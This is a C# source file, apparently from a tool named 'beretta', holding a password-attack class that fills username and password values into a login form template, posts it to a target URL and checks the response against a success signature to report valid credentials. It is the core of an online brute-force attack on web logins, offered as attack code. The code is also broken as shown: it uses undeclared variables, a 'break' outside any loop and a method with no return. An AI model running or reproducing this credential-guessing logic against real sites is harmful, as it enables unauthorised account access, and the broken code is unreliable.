using System;
using beretta.Modules.PasswordAttack;

namespace beretta.support
{
	/// <summary>
	/// Summary description for passwordAttack.
	/// </summary>
	public class passwordAttack
	{
		public string strUsername="";
		public string strPassword="";
		public int intId=0;

		protected passwordAttackConfig objPasswordAttackConfig;
	
		public passwordAttack()
		{
			
		}

		public bool start()
		{

			objPasswordAttackConfig=new passwordAttackConfig();
			objPasswordAttackConfig.id=intId;

			string strTmpFormSubmission="" + strFormSubmission;
			string strTmpReturn="";

			strTmpFormSubmission=strTmpFormSubmission.Replace("%%username%%", strUsername);
			strTmpFormSubmission=strTmpFormSubmission.Replace("%%password%%", strPassword);	

			strTmpReturn="" + objFormSubmitter.submitData(strTmpFormSubmission, objPasswordAttackConfig.url, true, "POST", "");


			if (checkIfMatchFound(strTmpReturn, strUsername, strPassword)==true)
			{
				bolMatchFound=true;
				break;
			}


		
		}


		private bool checkIfMatchFound(string strReturn, string strUsername, string strPassword)
		{

			string strTmp="";
			string strSignature="" + objPasswordAttackConfig.successSignature;
			bool bolMatch=false;
				
			//String Match
			if (objPasswordAttackConfig.signatureType==0)
			{
				if (objPasswordAttackConfig.signatureOperator=="=")
				{
					if (strReturn.IndexOf(strSignature)>=0)
					{
						bolMatch=true;
					}
				}
				else
				{
					if (strReturn.IndexOf(strSignature)==-1)
					{
						bolMatch=true;
					}
				}
			}

			if(objPasswordAttackConfig.signatureType==1)
			{

				Regex objRegex = new Regex(strSignature, RegexOptions.IgnoreCase);

				MatchCollection matches = objRegex.Matches(strReturn);

				if (matches.Count > 0)
				{
					if (objPasswordAttackConfig.signatureOperator=="=")
					{
						bolMatch=true;
					}
					else
					{
						bolMatch=false;
					}
					
				}
				else
				{
					if (objPasswordAttackConfig.signatureOperator=="=")
					{
						bolMatch=false;
					}
					else
					{
						bolMatch=true;
					}
				}

				objRegex = null;
				matches = null;

			}

			if (bolMatch==true)
			{
				strTmp+="Match Found<BR>";
				strTmp+="Username: " + strUsername + "<BR>";
				strTmp+="Password: " + strPassword + "<BR>";

				lblResult.Text=strTmp;

				return true;
			}
			else
			{
				return false;
			}


		}
	}
}
